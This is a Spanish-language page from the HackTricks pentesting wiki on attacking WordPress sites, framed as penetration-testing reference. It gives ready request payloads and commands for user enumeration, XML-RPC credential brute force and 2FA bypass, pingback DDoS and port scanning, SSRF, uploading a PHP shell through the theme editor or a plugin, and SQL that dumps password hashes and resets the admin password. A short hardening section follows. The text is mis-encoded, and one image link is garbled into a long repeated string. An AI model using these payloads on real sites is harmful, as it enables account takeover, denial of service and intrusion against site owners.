# Wordpress

<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) para construir y **automatizar flujos de trabajo** impulsados por las herramientas comunitarias **m√°s avanzadas** del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Informaci√≥n B√°sica

Los archivos **subidos** van a: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
Los archivos de **temas se pueden encontrar en /wp-content/themes/**, por lo que si cambias alg√∫n php del tema para obtener RCE probablemente uses esa ruta. Por ejemplo: Usando el **tema twentytwelve** puedes **acceder** al archivo **404.php** en: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Otra URL √∫til podr√≠a ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

En **wp-config.php** puedes encontrar la contrase√±a ra√≠z de la base de datos.

Rutas de inicio de sesi√≥n predeterminadas para verificar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Archivos Principales de WordPress**

* `index.php`
* `license.txt` contiene informaci√≥n √∫til como la versi√≥n de WordPress instalada.
* `wp-activate.php` se utiliza para el proceso de activaci√≥n por correo electr√≥nico al configurar un nuevo sitio de WordPress.
* Carpetas de inicio de sesi√≥n (pueden ser renombradas para ocultarlas):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` es un archivo que representa una caracter√≠stica de WordPress que permite que los datos se transmitan con HTTP actuando como mecanismo de transporte y XML como mecanismo de codificaci√≥n. Este tipo de comunicaci√≥n ha sido reemplazado por la [API REST](https://developer.wordpress.org/rest-api/reference) de WordPress.
* La carpeta `wp-content` es el directorio principal donde se almacenan los plugins y temas.
* `wp-content/uploads/` Es el directorio donde se almacenan los archivos subidos a la plataforma.
* `wp-includes/` Este es el directorio donde se almacenan los archivos principales, como certificados, fuentes, archivos JavaScript y widgets.
* `wp-sitemap.xml` En las versiones de Wordpress 5.5 y superiores, Wordpress genera un archivo XML de sitemap con todas las publicaciones p√∫blicas y tipos de publicaciones y taxonom√≠as p√∫blicamente consultables.

**Explotaci√≥n Posterior**

* El archivo `wp-config.php` contiene la informaci√≥n requerida por WordPress para conectarse a la base de datos, como el nombre de la base de datos, el host de la base de datos, nombre de usuario y contrase√±a, claves de autenticaci√≥n y sales, y el prefijo de la tabla de la base de datos. Este archivo de configuraci√≥n tambi√©n se puede utilizar para activar el modo DEBUG, que puede ser √∫til para la soluci√≥n de problemas.

### Permisos de Usuarios

* **Administrador**
* **Editor**: Publica y gestiona sus propias publicaciones y las de otros.
* **Autor**: Publica y gestiona sus propias publicaciones.
* **Colaborador**: Escribe y gestiona sus publicaciones pero no puede publicarlas.
* **Suscriptor**: Navega por las publicaciones y edita su perfil.

## **Enumeraci√≥n Pasiva**

### **Obtener la versi√≥n de WordPress**

Verifica si puedes encontrar los archivos `/license.txt` o `/readme.html`

Dentro del **c√≥digo fuente** de la p√°gina (ejemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1111).png>)

* Archivos de enlace CSS

![](<../../.gitbook/assets/image (533).png>)

* Archivos de JavaScript

![](<../../.gitbook/assets/image (524).png>)

### Obtener Plugins

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### Obtener Temas

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraer versiones en general

{% endcode %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Enumeraci√≥n activa

### Plugins y Temas

Probablemente no podr√°s encontrar todos los Plugins y Temas posibles. Para descubrir todos ellos, necesitar√°s **realizar un Brute Force activo de una lista de Plugins y Temas** (afortunadamente existen herramientas automatizadas que contienen estas listas).

### Usuarios

**Brute Force de ID**

Puedes obtener usuarios v√°lidos de un sitio de WordPress realizando un Brute Force de los IDs de usuarios:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
Si las respuestas son **200** o **30X**, eso significa que el id es **v√°lido**. Si la respuesta es **400**, entonces el id es **inv√°lido**.

**wp-json**

Tambi√©n puedes intentar obtener informaci√≥n sobre los usuarios haciendo consultas:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
Otro endpoint `/wp-json/` que puede revelar informaci√≥n sobre los usuarios es:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Ten en cuenta que este endpoint solo expone a los usuarios que han realizado una publicaci√≥n. **Solo se proporcionar√° informaci√≥n sobre los usuarios que tengan esta funci√≥n habilitada**.

Tambi√©n ten en cuenta que **/wp-json/wp/v2/pages** podr√≠a filtrar direcciones IP.

#### Enumeraci√≥n de nombres de usuario de inicio de sesi√≥n

Al iniciar sesi√≥n en **`/wp-login.php`** el **mensaje** es **diferente** si el **nombre de usuario indicado existe o no**.

### XML-RPC

Si `xml-rpc.php` est√° activo, puedes realizar un ataque de fuerza bruta de credenciales o utilizarlo para lanzar ataques de denegaci√≥n de servicio (DoS) a otros recursos. (Puedes automatizar este proceso [usando esto](https://github.com/relarizky/wpxploit) por ejemplo).

Para verificar si est√° activo intenta acceder a _**/xmlrpc.php**_ y env√≠a esta solicitud:

**Check**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Fuerza bruta de credenciales**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** son algunos de los m√©todos que se pueden utilizar para realizar fuerza bruta de credenciales. Si puedes encontrar alguno de ellos, puedes enviar algo como:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
El mensaje _"Nombre de usuario o contrase√±a incorrectos"_ dentro de una respuesta de c√≥digo 200 deber√≠a aparecer si las credenciales no son v√°lidas.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Tambi√©n hay una **forma m√°s r√°pida** de probar credenciales usando **`system.multicall`** ya que puedes intentar varias credenciales en la misma solicitud:

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

**Saltar la autenticaci√≥n de dos factores (2FA)**

Este m√©todo est√° destinado para programas y no para humanos, y es antiguo, por lo tanto no es compatible con 2FA. Por lo tanto, si tienes credenciales v√°lidas pero la entrada principal est√° protegida por 2FA, **podr√≠as abusar de xmlrpc.php para iniciar sesi√≥n con esas credenciales evitando el 2FA**. Ten en cuenta que no podr√°s realizar todas las acciones que puedes hacer a trav√©s de la consola, pero a√∫n podr√≠as lograr RCE como lo explica Ippsec en [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS o escaneo de puertos**

Si puedes encontrar el m√©todo _**pingback.ping**_ en la lista, puedes hacer que Wordpress env√≠e una solicitud arbitraria a cualquier host/puerto.\
Esto se puede utilizar para pedirle a **miles** de **sitios** de **Wordpress** que **accedan** a una **ubicaci√≥n** espec√≠fica (causando un **DDoS** en esa ubicaci√≥n) o puedes usarlo para hacer que **Wordpress** **escanee** alguna red interna (puedes indicar cualquier puerto).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si obtienes **faultCode** con un valor **mayor** que **0** (17), significa que el puerto est√° abierto.

Echa un vistazo al uso de **`system.multicall`** en la secci√≥n anterior para aprender c√≥mo abusar de este m√©todo para causar un DDoS.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (110).png>)

### wp-cron.php DoS

Este archivo generalmente se encuentra en la ra√≠z del sitio de Wordpress: **`/wp-cron.php`**\
Cuando este archivo es **accedido** se realiza una **consulta** MySQL "**pesada**", por lo que podr√≠a ser utilizado por **atacantes** para **causar** un **DoS**.\
Adem√°s, de forma predeterminada, el `wp-cron.php` se llama en cada carga de p√°gina (cada vez que un cliente solicita cualquier p√°gina de Wordpress), lo que en sitios con mucho tr√°fico puede causar problemas (DoS).

Se recomienda deshabilitar Wp-Cron y crear una tarea cron real dentro del host que realice las acciones necesarias en un intervalo regular (sin causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Intenta acceder a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ y el sitio de Wordpress puede hacer una solicitud a ti.

Esta es la respuesta cuando no funciona:

![](<../../.gitbook/assets/image (365).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

Esta herramienta verifica si el **methodName: pingback.ping** y la ruta **/wp-json/oembed/1.0/proxy** existen, y si es as√≠, intenta explotarlos.

### Herramientas Autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Obtenga acceso sobrescribiendo un bit

M√°s que un ataque real, esto es una curiosidad. En el CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) podr√≠a cambiar 1 bit de cualquier archivo de Wordpress. Por lo tanto, podr√≠a cambiar la posici√≥n `5389` del archivo `/var/www/html/wp-includes/user.php` para anular la operaci√≥n NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modificaci√≥n de un archivo php desde el tema utilizado (se necesitan credenciales de administrador)**

Apariencia ‚Üí Editor de Temas ‚Üí Plantilla 404 (a la derecha)

Cambiar el contenido por un shell php:

![](<../../.gitbook/assets/image (384).png>)

Busca en internet c√≥mo puedes acceder a esa p√°gina actualizada. En este caso, debes acceder aqu√≠: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puedes usar:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## Plugin RCE

### Plugin RCE

### Plugin RCE

Puede ser posible subir archivos .php como un plugin.\
Cree su puerta trasera php usando por ejemplo:

![](<../../.gitbook/assets/image (183).png>)

Luego agregue un nuevo plugin:

![](<../../.gitbook/assets/image (722).png>)

Suba el plugin y presione Instalar ahora:

![](<../../.gitbook/assets/image (249).png>)

Haga clic en Proceder:

![](<../../.gitbook/assets/image (70).png>)

Probablemente esto no haga nada aparentemente, pero si va a Medios, ver√° su shell subida:

![](<../../.gitbook/assets/image (462).png>)

Acceda a √©l y ver√° la URL para ejecutar la shell inversa:

![](<../../.gitbook/assets/image (1006).png>)

### Subir y activar plugin malicioso

Este m√©todo implica la instalaci√≥n de un plugin malicioso conocido por ser vulnerable y que puede ser explotado para obtener una shell web. Este proceso se lleva a cabo a trav√©s del panel de WordPress de la siguiente manera:

1. **Adquisici√≥n del Plugin**: El plugin se obtiene de una fuente como Exploit DB como [**aqu√≠**](https://www.exploit-db.com/exploits/36374).
2. **Instalaci√≥n del Plugin**:
* Navegue hasta el panel de WordPress, luego vaya a `Panel > Plugins > Subir Plugin`.
* Suba el archivo zip del plugin descargado.
3. **Activaci√≥n del Plugin**: Una vez que el plugin se instala correctamente, debe ser activado a trav√©s del panel.
4. **Explotaci√≥n**:
* Con el plugin "reflex-gallery" instalado y activado, puede ser explotado ya que se sabe que es vulnerable.
* El framework Metasploit proporciona un exploit para esta vulnerabilidad. Cargando el m√≥dulo apropiado y ejecutando comandos espec√≠ficos, se puede establecer una sesi√≥n de meterpreter, otorgando acceso no autorizado al sitio.
* Se se√±ala que este es solo uno de los muchos m√©todos para explotar un sitio de WordPress.

El contenido incluye ayudas visuales que representan los pasos en el panel de WordPress para instalar y activar el plugin. Sin embargo, es importante tener en cuenta que explotar vulnerabilidades de esta manera es ilegal e inmoral sin la autorizaci√≥n adecuada. Esta informaci√≥n debe ser utilizada de manera responsable y solo en un contexto legal, como pruebas de penetraci√≥n con permiso expl√≠cito.

**Para obtener pasos m√°s detallados, consulte:** [**https://www.hackingarticles.in/wordpress-reverse-shell/\*\***](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Post Explotaci√≥n

Extraer nombres de usuario y contrase√±as:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambiar contrase√±a de administrador:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Protecci√≥n de WordPress

### Actualizaciones regulares

Aseg√∫rate de que WordPress, los plugins y los temas est√©n actualizados. Tambi√©n confirma que la actualizaci√≥n autom√°tica est√° habilitada en wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Tambi√©n, **solo instala plugins y temas de WordPress confiables**.

### Plugins de Seguridad

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Otras Recomendaciones**

* Eliminar el usuario **admin** por defecto
* Utilizar **contrase√±as fuertes** y **2FA**
* Revisar peri√≥dicamente los **permisos** de los usuarios
* **Limitar los intentos de inicio de sesi√≥n** para prevenir ataques de Fuerza Bruta
* Renombrar el archivo **`wp-admin.php`** y permitir el acceso solo internamente o desde ciertas direcciones IP.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
